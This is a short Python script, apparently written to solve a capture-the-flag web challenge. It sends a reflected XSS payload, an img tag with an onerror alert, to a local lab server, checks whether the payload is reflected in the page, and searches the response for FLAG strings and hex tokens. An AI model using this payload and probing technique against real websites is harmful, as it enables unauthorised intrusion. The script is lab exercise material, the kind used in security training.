import requests
import re

# Target URL with XSS payload
url = "http://127.0.0.1:33203/page?name=<img src=x onerror=alert('XSS')>"

print(f"[+] Fetching: {url}")

# Send GET request
response = requests.get(url)

print(f"[+] Response Status Code: {response.status_code}")
print(f"[+] Response Headers:\n{dict(response.headers)}")
print(f"[+] Response Body (Full):\n{'='*80}")
print(response.text)
print(f"\n{'='*80}")

# Search for FLAG{ patterns
debug_flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
print(f"\n[+] FLAG Search Results:")
if debug_flag_matches:
    for i, flag in enumerate(debug_flag_matches, 1):
        print(f"[!] FLAG FOUND #{i}: {flag}")
else:
    print("[-] No FLAG{ pattern found in response")

# Look for where the name parameter value appears (reflection analysis)
print(f"\n[+] Payload Reflection Analysis:")
payload_value = "<img src=x onerror=alert('XSS')>"
if payload_value in response.text:
    print(f"[+] XSS payload appears reflected in response")
    
    # Find all locations where payload appears
    for match in re.finditer(re.escape(payload_value), response.text):
        context_start = max(0, match.start() - 50)
        context_end = min(len(response.text), match.end() + 50)
        context = response.text[context_start:context_end]
        print(f"\n[+] Context around reflection:")
        print(f"    Position {match.start()}-{match.end()}")
        print(f"    Context:\n    {context}")
else:
    print("[-] Payload does not appear to be reflected")

# Search for common flag patterns in different formats
print(f"\n[+] Additional Pattern Search:")
patterns = [
    r'flag\{[^}]+\}',  # lowercase flag
    r'[a-fA-F0-9]{32}',  # 32 char hex (potential hash)
    r'[a-fA-F0-9]{16}',  # 16 char hex
]

for pattern in patterns:
    matches = re.findall(pattern, response.text, re.IGNORECASE)
    if matches:
        print(f"[+] Found {len(matches)} matches for pattern {pattern}")
        print(f"    Sample matches: {matches[:5]}")  # Show first 5

# Check for any hidden elements, comments that might contain flags
comment_matches = re.findall(r'<!.+?-->', response.text, re.DOTALL)
if comment_matches:
    print(f"\n[+] Found {len(comment_matches)} HTML comments - checking for flags...")
    for i, comment in enumerate(comment_matches[:3], 1):  # Check first 3
        print(f"[+] Comment #{i}: {comment[:100]}...")
        if 'FLAG{' in comment or 'flag{' in comment:
            print(f"[!] FLAG FOUND in comment #{i}!")
